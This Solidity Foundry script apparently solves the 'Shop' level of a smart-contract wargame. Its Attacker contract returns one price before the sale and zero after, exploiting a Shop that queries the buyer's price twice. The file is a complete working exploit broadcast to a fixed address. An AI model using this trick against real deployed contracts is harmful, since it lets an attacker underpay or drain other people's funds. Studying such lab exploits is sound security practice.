// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Shop, Buyer} from "../src/L21Shop.sol";

// 0xF1823bc4243b40423b8C8c3F6174e687a4C690b8

contract L21ShopAttack is Script, Broadcast {
    Shop shop = Shop(0xF1823bc4243b40423b8C8c3F6174e687a4C690b8);

    function run() public broadcast {
        Attacker attacker = new Attacker(address(shop));
        console.log("==== Attacker initialized ====");
        console.log("Initial price: ", shop.price());
        attacker.attack();
        console.log("Final price: ", shop.price());
    }
}

contract Attacker is Buyer {
    Shop shop;
    bool firstCall;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() public view override returns (uint256) {
        return !shop.isSold() ? 100 : 0;
    }

    function attack() public {
        shop.buy();
        firstCall = false;
    }
}
